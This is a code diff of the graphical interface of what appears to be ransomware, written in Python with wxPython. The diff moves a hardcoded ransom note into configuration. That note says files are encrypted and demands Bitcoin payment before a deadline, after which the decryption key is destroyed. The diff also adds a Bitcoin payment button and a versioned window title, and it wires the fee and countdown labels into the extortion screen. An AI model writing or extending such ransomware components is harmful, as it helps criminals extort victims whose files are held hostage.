@@ -140,18 +140,6 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 		
 		# Define other vars
 		self.set_message_to_null = True
-		self.GUI_RANSOM_MESSAGE = (
-			"The important files on your computer have been encrypted with"
-            " military grade AES-256 bit encryption.\n\nYour documents, videos"
-            " images and other forms of data are now inaccessible, and cannot"
-          	" be unlocked without the decryption key. This key is currently"
-          	" being stored on a remote server.\n\nTo acquire this key, transfer"
-          	" a total of %s BTC to the Bitcoin wallet address below within %s"
-          	" hours.\n\nIf you fail to take action within this time window,"
-          	" the decryption key will be destroyed and access to your files"
-          	" will be permanently lost." % 
-          	(self.__config["bitcoin_fee"], (int(self.__config["key_destruction_time"]) / 60 / 60))
-          	)
 		
 		# Super
 		MainFrame.__init__( self, parent=None )
@@ -388,25 +376,35 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 		@summary: Method to update the GUI visuals/aesthetics, i.e labels, images etc.
 		'''
 
-		# Set title
-		#self.CrypterTitleBitmap.SetBitmap(
-		#	wx.Bitmap(
-		#		os.path.join(self.image_path, self.GUI_IMAGE_TITLE),
-		#		wx.BITMAP_TYPE_ANY))
-		
+		# Titles
+		self.SetTitle(self.GUI_LABEL_TEXT_TITLE[self.LANG] + " v%s.%s" % (
+			self.__config["maj_version"],
+			self.__config["min_version"]
+			)
+		)
 		self.TitleLabel.SetLabel(self.GUI_LABEL_TEXT_TITLE[self.LANG])
 		
 		# Set flashing text initial label
 		self.FlashingMessageText.SetLabel(self.GUI_LABEL_TEXT_FLASHING_ENCRYPTED[self.LANG])
 		
 		# Set Ransom Message
-		self.RansomNoteText.SetValue(self.GUI_RANSOM_MESSAGE)
+		self.RansomMessageText.SetValue(self.__config["ransom_message"])
 
 		# Set Logo
 		self.LockBitmap.SetBitmap(
 			wx.Bitmap(
 				os.path.join(self.image_path, self.GUI_IMAGE_LOGO),
-				wx.BITMAP_TYPE_ANY))
+				wx.BITMAP_TYPE_ANY
+			)
+		)
+		
+		# Set Bitcoin Button logo
+		self.BitcoinButton.SetBitmap(
+			wx.Bitmap(
+				os.path.join(self.image_path, self.GUI_IMAGE_BUTTON),
+				wx.BITMAP_TYPE_ANY
+			)
+		)
 
 		# Set key destruction label
 		self.TimeRemainingLabel.SetLabel(self.GUI_LABEL_TEXT_TIME_REMAINING[self.LANG])
@@ -422,7 +420,7 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 
 		# Set Bitcoin Fee Value
 		self.BitcoinFeeString.SetLabel(self.__config["bitcoin_fee"])
-
+		
 		# Set Button Text
 		self.ViewEncryptedFilesButton.SetLabel(self.GUI_BUTTON_TEXT_VIEW_ENCRYPTED_FILES[self.LANG])
 		self.EnterDecryptionKeyButton.SetLabel(self.GUI_BUTTON_TEXT_ENTER_DECRYPTION_KEY[self.LANG])
